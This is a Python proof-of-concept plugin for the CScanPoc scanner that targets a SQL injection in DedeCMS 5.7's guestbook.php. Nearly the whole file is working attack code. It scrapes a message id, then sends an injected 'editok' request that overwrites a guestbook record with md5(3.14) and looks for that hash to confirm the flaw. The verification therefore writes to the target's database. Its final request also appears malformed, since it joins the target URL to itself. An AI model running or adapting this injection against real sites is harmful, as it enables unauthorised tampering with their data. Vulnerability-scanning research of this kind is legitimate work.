# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'DedeCMS_0006'  # 平台漏洞编号，留空
    name = '织梦CMS 5.7 guestbook.php sql注射'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-09-05'  # 漏洞公布时间
    desc = '''
        DedeCMS 5.7 guestbook.php sql注射漏洞
    '''  # 漏洞描述
    ref = 'http://www.shangxueba.com/jingyan/2190419.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'DedeCMS(织梦CMS)'  # 漏洞应用名称
    product_version = '5.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '6e2640d5-d419-4613-9c8e-e16c7548f30f'
    author = '国光'  # POC编写者
    create_date = '2018-05-13'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = '/plus/guestbook.php'
            url = '{target}'.format(target=self.target)+payload
            code, head, res, errcode, _ = hh.http(url)

            if code == 200:
                m = re.search(r'admin&id=(\d+)', res)
                if m:
                    a = m.group(1)
                    payload1 = 'plus/guestbook.php?action=admin&job=editok&id='
                    payload2 = "&msg=%27,msg=md5(3.14),email=%27"
                    payload = payload1 + a + payload2
                    verify_url = '{target}'.format(
                        target=self.target) + payload
                    _, _, _, _, _ = hh.http(verify_url)
                    code, head, res, errcode, _ = hh.http(
                        '{target}'.format(target=self.target)+url)
                    if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
                        self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
